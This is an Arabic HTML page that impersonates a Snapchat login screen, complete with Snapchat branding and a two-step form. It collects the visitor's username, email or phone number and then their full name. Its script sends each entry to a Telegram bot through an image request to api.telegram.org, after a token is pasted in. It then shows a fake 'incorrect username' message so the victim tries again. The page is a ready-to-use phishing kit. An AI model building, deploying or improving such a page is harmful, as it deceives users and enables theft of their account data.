<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تسجيل الدخول — صفحتان في ملف واحد</title>

  <!-- ضع القيم على جهازك فقط إن أردت الإرسال الفعلي -->
  <script>
    const TG_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
    const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
  </script>

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#f6fbff; --card:#fff; --accent:#ffd400; --primary:#0da4ff;
      --muted:#8b97a6; --danger:#e04b4b; --radius:16px; --shadow:0 18px 50px rgba(10,20,30,0.08);
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:linear-gradient(#f8fbff, #f3f7fb);font-family:'Cairo',system-ui,Arial;color:#0b2a33;direction:rtl}
    .frame{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px}
    .device{width:420px;max-width:100%}

    /* page container styles (each page full card) */
    .page{
      background:var(--card);
      border-radius:20px;
      padding:20px;
      box-shadow:var(--shadow);
      overflow:hidden;
      min-height:420px;
      transition:transform .26s ease, opacity .26s ease;
    }
    .hidden{display:none}
    .brand{display:flex;justify-content:center;margin-top:-36px;margin-bottom:8px}
    .brand-pill{display:inline-flex;gap:10px;align-items:center;background:linear-gradient(180deg,var(--accent),#ffdf86);padding:10px 16px;border-radius:999px;font-weight:800;box-shadow:0 12px 28px rgba(0,0,0,0.12)}
    .brand-pill img{width:20px;height:20px;object-fit:contain}
    .logo{display:flex;justify-content:center;margin-bottom:6px}
    .logo img{width:74px;height:74px;object-fit:contain}
    h1{font-size:24px;margin:6px 0 6px;text-align:center;font-weight:800}
    p.lead{margin:0;text-align:center;color:var(--muted);font-size:14px;margin-bottom:14px}

    label{display:block;color:var(--muted);margin-bottom:8px;font-size:14px}
    input[type="text"], input[type="email"], input[type="tel"], .select-btn{
      width:100%;padding:13px 12px;border-radius:12px;border:1px solid #eef6ff;background:#fff;font-size:16px;outline:none;
      box-shadow:0 8px 22px rgba(10,20,30,0.03);
    }
    .select-btn{display:inline-flex;align-items:center;gap:8px;cursor:pointer}

    .controls{display:flex;gap:10px;align-items:center;justify-content:center;margin-top:16px}
    .btn{background:var(--primary);color:#fff;padding:12px 18px;border-radius:10px;border:none;font-weight:800;cursor:pointer;min-width:140px;box-shadow:0 10px 28px rgba(13,164,255,0.16)}
    .btn.ghost{background:#fff;color:var(--primary);border:1px solid #e8f6ff;box-shadow:none}

    .hint{font-size:13px;color:var(--muted);text-align:center;margin-top:12px}
    .small{font-size:13px;color:var(--muted)}

    /* country modal */
    .modal-back{position:fixed;inset:0;display:none;align-items:flex-end;justify-content:center;padding:12px;background:linear-gradient(180deg,rgba(0,0,0,0.28),rgba(0,0,0,0.34));z-index:90}
    .modal{width:100%;max-width:420px;background:var(--card);border-radius:16px;padding:12px;max-height:74vh;overflow:hidden;box-shadow:0 18px 60px rgba(0,0,0,0.24)}
    .modal input{width:100%;padding:10px;border-radius:10px;border:1px solid #eee}
    .country-list{overflow:auto;max-height:60vh;margin-top:8px;padding-right:6px}
    .country-item{display:flex;align-items:center;justify-content:space-between;padding:10px;border-radius:10px;cursor:pointer}
    .country-item:hover{background:#f6fbff}

    /* toast */
    .toast-back{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:100}
    .toast{background:#fff;padding:18px;border-radius:12px;box-shadow:0 18px 56px rgba(0,0,0,0.22);width:92%;max-width:360px;text-align:center}
    .toast h3{margin:0 0 8px;font-size:18px}
    .toast p{margin:0;color:#444;font-size:15px}
    .toast button{margin-top:12px;padding:10px 14px;border-radius:8px;background:var(--primary);color:#fff;border:none;cursor:pointer;font-weight:700}

    @media(max-width:420px){ .device{width:360px} h1{font-size:20px} .logo img{width:64px;height:64px} }
  </style>
</head>
<body>
  <div class="frame">
    <div class="device">

      <!-- PAGE 1 -->
      <main id="page1" class="page" role="main" aria-label="الصفحة الأولى">
        <div class="brand" aria-hidden="true"><div class="brand-pill"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /> Open Snapchat</div></div>
        <div class="logo"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /></div>
        <h1>تسجيل الدخول إلى سناب شات</h1>
        <p class="lead">أدخل اسم المستخدم أو البريد الإلكتروني — أو استخدم رقم الهاتف.</p>

        <div class="field">
          <label id="primaryLabel">اسم المستخدم أو البريد الإلكتروني</label>
          <div id="primaryHolder">
            <input id="primary" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />
          </div>
        </div>

        <div style="text-align:center;margin-top:6px">
          <button id="phoneToggle" class="select-btn" type="button">استخدم رقم الهاتف بدلاً من ذلك</button>
        </div>

        <div class="controls">
          <button id="btnNext" class="btn">التالي</button>
        </div>

        <div class="hint" id="hint1"></div>
      </main>

      <!-- PAGE 2 (NAME) -->
      <main id="page2" class="page hidden" role="main" aria-label="الصفحة الثانية">
        <div class="brand" aria-hidden="true"><div class="brand-pill"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /> Open Snapchat</div></div>
        <div class="logo"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /></div>
        <h1>التحقق — خطوة إضافية</h1>
        <p class="lead">الرجاء إدخال الاسم لإكمال التحقق</p>

        <div class="field">
          <label for="name">الاسم الكامل</label>
          <input id="name" type="text" placeholder="أدخل الاسم الكامل" autocomplete="off" />
        </div>

        <div class="controls">
          <button id="btnSend" class="btn">إرسال الاسم</button>
          <button id="btnBack" class="btn ghost">العودة</button>
        </div>

        <div class="hint" id="hint2"></div>
      </main>

    </div>
  </div>

  <!-- country modal -->
  <div id="countryModal" class="modal-back" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true" aria-label="اختر الدولة">
      <div style="text-align:center;font-weight:700;margin-bottom:6px">اختر الدولة</div>
      <input id="countrySearch" placeholder="ابحث عن دولة أو رمز..." class="search-input" />
      <div id="countryList" class="country-list" role="listbox"></div>
    </div>
  </div>

  <!-- toast -->
  <div id="toastWrap" class="toast-back" aria-hidden="true">
    <div class="toast" role="alertdialog">
      <h3 id="toastTitle">عذراً</h3>
      <p id="toastMsg">اسم المستخدم أو الاسم غير صحيح. يرجى التحقق والمحاولة مرة أخرى.</p>
      <div><button id="toastBtn">حسناً</button></div>
    </div>
  </div>

  <script>
    // ========= helpers & config =========
    const COUNTRIES = [
      {name:'الأردن', code:'JO', dial:'+962', flag:'🇯🇴'},
      {name:'مصر', code:'EG', dial:'+20', flag:'🇪🇬'},
      {name:'السعودية', code:'SA', dial:'+966', flag:'🇸🇦'},
      {name:'الإمارات', code:'AE', dial:'+971', flag:'🇦🇪'},
      {name:'الكويت', code:'KW', dial:'+965', flag:'🇰🇼'},
      {name:'لبنان', code:'LB', dial:'+961', flag:'🇱🇧'},
      {name:'الولايات المتحدة', code:'US', dial:'+1', flag:'🇺🇸'},
      {name:'المملكة المتحدة', code:'GB', dial:'+44', flag:'🇬🇧'}
    ];
    const usernameRx = /^[A-Za-z0-9._-]{3,30}$/;
    const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const digitsOnly = s => s.replace(/[^\d]/g,'');

    // DOM
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const primaryHolder = document.getElementById('primaryHolder');
    let primaryInput = document.getElementById('primary');
    const phoneToggle = document.getElementById('phoneToggle');
    const btnNext = document.getElementById('btnNext');
    const hint1 = document.getElementById('hint1');

    const countryModal = document.getElementById('countryModal');
    const countryList = document.getElementById('countryList');
    const countrySearch = document.getElementById('countrySearch');

    const nameInput = document.getElementById('name');
    const btnSend = document.getElementById('btnSend');
    const btnBack = document.getElementById('btnBack');
    const hint2 = document.getElementById('hint2');

    const toastWrap = document.getElementById('toastWrap');
    const toastBtn = document.getElementById('toastBtn');
    const toastMsg = document.getElementById('toastMsg');

    // state
    let phoneMode = false;
    let selectedCountry = COUNTRIES[0];
    let prev = null; // {type,value,country}

    // ========== UI helpers ==========
    function showPage(id, push=true){
      if(id === 'page1'){
        page1.classList.remove('hidden');
        page2.classList.add('hidden');
        if(push) history.pushState({page:'page1'}, '', '#step1');
      } else {
        page1.classList.add('hidden');
        page2.classList.remove('hidden');
        if(push) history.pushState({page:'page2'}, '', '#step2');
      }
    }

    // initialize history state
    if(!location.hash) history.replaceState({page:'page1'}, '', '#step1');
    else history.replaceState({page: location.hash === '#step2' ? 'page2' : 'page1'}, '', location.hash);

    window.addEventListener('popstate', (e) => {
      const st = e.state && e.state.page ? e.state.page : 'page1';
      showPage(st, false);
    });

    // ========== primary input swap ==========
    function bindPrimaryAscii(el){
      el.addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\x00-\x7F]/g,'');
        if(e.target.value.length > 100) e.target.value = e.target.value.slice(0,100);
      });
      el.addEventListener('keydown', e => { if(e.key === 'Enter') btnNext.click(); });
    }

    function switchToPhone(){
      phoneMode = true;
      primaryHolder.innerHTML = `<div style="display:flex;gap:10px;align-items:center">
        <button id="countryBtn" class="select-btn" type="button"><span id="countryFlag">${selectedCountry.flag}</span>&nbsp;<span id="countryDial">${selectedCountry.dial}</span></button>
        <input id="phoneInput" type="tel" placeholder="أدخل رقم الهاتف" inputmode="numeric" />
      </div>`;
      document.getElementById('countryBtn').addEventListener('click', ()=> { renderCountries(COUNTRIES); countryModal.style.display='flex'; setTimeout(()=> countrySearch.focus(),120); });
      primaryInput = document.getElementById('phoneInput');
      primaryInput.addEventListener('input', e => { e.target.value = digitsOnly(e.target.value); });
      primaryInput.addEventListener('keydown', e => { if(e.key==='Enter') btnNext.click(); });
      phoneToggle.textContent = 'استخدم البريد الإلكتروني/اسم المستخدم بدلاً من ذلك';
      hint1.textContent = '';
      primaryInput.focus();
    }

    function switchToPrimary(){
      phoneMode = false;
      primaryHolder.innerHTML = `<input id="primary" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />`;
      primaryInput = document.getElementById('primary');
      bindPrimaryAscii(primaryInput);
      phoneToggle.textContent = 'استخدم رقم الهاتف بدلاً من ذلك';
      hint1.textContent = '';
      primaryInput.focus();
    }

    phoneToggle.addEventListener('click', ()=> {
      if(!phoneMode) switchToPhone(); else switchToPrimary();
    });

    // ========== country modal ==========
    function renderCountries(list){
      countryList.innerHTML = '';
      list.forEach(c => {
        const row = document.createElement('div');
        row.className = 'country-item';
        row.innerHTML = `<div style="display:flex;gap:10px;align-items:center"><span style="font-size:20px">${c.flag}</span><div style="display:flex;flex-direction:column;margin-right:8px"><strong>${c.name}</strong><small style="color:var(--muted);font-size:12px">${c.code}</small></div></div><div style="font-weight:700;color:#333">${c.dial}</div>`;
        row.addEventListener('click', ()=> {
          selectedCountry = c;
          const cf = document.getElementById('countryFlag');
          const cd = document.getElementById('countryDial');
          if(cf) cf.textContent = c.flag;
          if(cd) cd.textContent = c.dial;
          countryModal.style.display = 'none';
          const pi = document.getElementById('phoneInput');
          if(pi){ pi.placeholder = 'أدخل رقم الهاتف ' + c.dial; pi.focus(); }
        });
        countryList.appendChild(row);
      });
      if(list.length === 0) countryList.innerHTML = '<div style="padding:12px;color:var(--muted);text-align:center">لا توجد نتائج</div>';
    }
    countrySearch.addEventListener('input', ()=> {
      const q = countrySearch.value.trim().toLowerCase();
      if(!q) return renderCountries(COUNTRIES);
      const filtered = COUNTRIES.filter(c => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.dial.includes(q));
      renderCountries(filtered);
    });
    countryModal.addEventListener('click', e => { if(e.target === countryModal) countryModal.style.display = 'none'; });

    // ========== detect & validate primary ==========
    function validatePrimary(){
      if(phoneMode){
        const v = (document.getElementById('phoneInput')||{value:''}).value.trim();
        const clean = digitsOnly(v);
        if(clean.length < 6){ hint1.style.color='crimson'; hint1.textContent='الرجاء إدخال رقم هاتف صالح'; setTimeout(()=> hint1.textContent='',2000); return null; }
        return {type:'phone', value: clean, country:selectedCountry};
      } else {
        const v = (document.getElementById('primary')||{value:''}).value.trim();
        if(!v){ hint1.style.color='crimson'; hint1.textContent='الرجاء إدخال اسم المستخدم أو البريد'; setTimeout(()=> hint1.textContent='',2000); return null; }
        if(v.includes('@')){
          if(!emailRx.test(v)){ hint1.style.color='crimson'; hint1.textContent='بريد إلكتروني غير صالح'; setTimeout(()=> hint1.textContent='',2200); return null; }
          return {type:'email', value:v};
        } else {
          if(!usernameRx.test(v)){ hint1.style.color='crimson'; hint1.textContent='اسم مستخدم غير صالح (3-30 حرف إنجليزي / رقم / . _ -)'; setTimeout(()=> hint1.textContent='',3000); return null; }
          return {type:'username', value:v};
        }
      }
    }

    // ========== send to Telegram (Image GET, no time) ==========
    function canSend(){
      return typeof TG_TOKEN !== 'undefined' && typeof TG_CHAT_ID !== 'undefined' && TG_TOKEN && TG_CHAT_ID && !TG_TOKEN.includes('PASTE');
    }
    function sendTelegramText(text){
      if(!canSend()){
        hint1.style.color='#b45a00';
        hint1.textContent = 'التوكن لم يُضف في الملف — لا يتم الإرسال فعلياً.';
        setTimeout(()=> hint1.textContent = '',2500);
        return false;
      }
      try{
        const url = `https://api.telegram.org/bot${encodeURIComponent(TG_TOKEN)}/sendMessage?chat_id=${encodeURIComponent(TG_CHAT_ID)}&text=${encodeURIComponent(text)}`;
        const img = new Image();
        img.src = url + '&_=' + Date.now();
        console.log('TG send:', url);
        return true;
      } catch(e){
        console.error(e);
        return false;
      }
    }

    // ========== navigation & actions ==========
    // Next on page1
    btnNext.addEventListener('click', ()=> {
      const p = validatePrimary();
      if(!p) return;
      prev = p;
      // send primary (no time)
      const countryText = p.type==='phone' && p.country ? `${p.country.name} ${p.country.dial}` : '—';
      const msg = `النوع: ${p.type}\nالقيمة: ${p.value}\nالبلد: ${countryText}`;
      sendTelegramText(msg);
      // navigate to page2
      showPage('page2');
    });

    // Send final
    btnSend.addEventListener('click', ()=> {
      const name = nameInput.value.trim();
      if(!name){ hint2.style.color='crimson'; hint2.textContent='الرجاء إدخال الاسم'; setTimeout(()=> hint2.textContent='',2200); return; }
      if(!prev){ showProfessionalToast('خطأ','لا توجد بيانات سابقة — عد للصفحة الأولى.'); return; }
      const countryText = prev.type==='phone' && prev.country ? `${prev.country.name} ${prev.country.dial}` : '—';
      const msg = `النوع: ${prev.type}\nالقيمة: ${prev.value}\nالبلد: ${countryText}\nالاسم: ${name}`;
      sendTelegramText(msg);
      // professional toast as requested
      showProfessionalToast('عذراً','اسم المستخدم أو الاسم غير صحيح. يرجى التحقق من المعلومات والمحاولة مرة أخرى.');
      // clear in-memory
      prev = null;
      nameInput.value = '';
    });

    btnBack.addEventListener('click', ()=> {
      showPage('page1');
    });

    // show professional toast
    function showProfessionalToast(title, text){
      document.getElementById('toastTitle').textContent = title;
      toastMsg.textContent = text;
      toastWrap.style.display = 'flex';
    }
    toastBtn.addEventListener('click', ()=> {
      toastWrap.style.display = 'none';
      // return to page1 for retry
      showPage('page1');
      // focus primary
      const pi = document.getElementById('primary') || document.getElementById('phoneInput');
      if(pi) pi.focus();
    });

    // enter key: behave contextually
    document.addEventListener('keydown', function(e){
      if(e.key === 'Enter'){
        if(!page2.classList.contains('hidden')) { e.preventDefault(); btnSend.click(); }
        else { e.preventDefault(); btnNext.click(); }
      }
      if(e.key === 'Escape'){
        if(countryModal.style.display === 'flex') countryModal.style.display = 'none';
        if(toastWrap.style.display === 'flex') toastWrap.style.display = 'none';
      }
    });

    // init
    (function init(){
      bindPrimaryAscii = function(el){ el.addEventListener('input', e => { e.target.value = e.target.value.replace(/[^\x00-\x7F]/g,''); if(e.target.value.length>100) e.target.value = e.target.value.slice(0,100); }); el.addEventListener('keydown', e => { if(e.key==='Enter') btnNext.click(); }); };
      bindPrimaryAscii(primaryInput);
      renderCountries(COUNTRIES);
      // preserve history navigation between pages
      if(location.hash === '#step2') showPage('page2', false);
      else showPage('page1', false);
    })();

    // pushState-aware showPage
    function showPage(p, push=true){
      if(p === 'page1'){ page1.classList.remove('hidden'); page2.classList.add('hidden'); if(push) history.pushState({page:'page1'},'', '#step1'); }
      else { page1.classList.add('hidden'); page2.classList.remove('hidden'); if(push) history.pushState({page:'page2'},'', '#step2'); }
    }

    // handle back button direct
    window.addEventListener('popstate', (e) => {
      const s = e.state && e.state.page ? e.state.page : (location.hash === '#step2' ? 'page2' : 'page1');
      showPage(s, false);
    });

  </script>
</body>
</html>
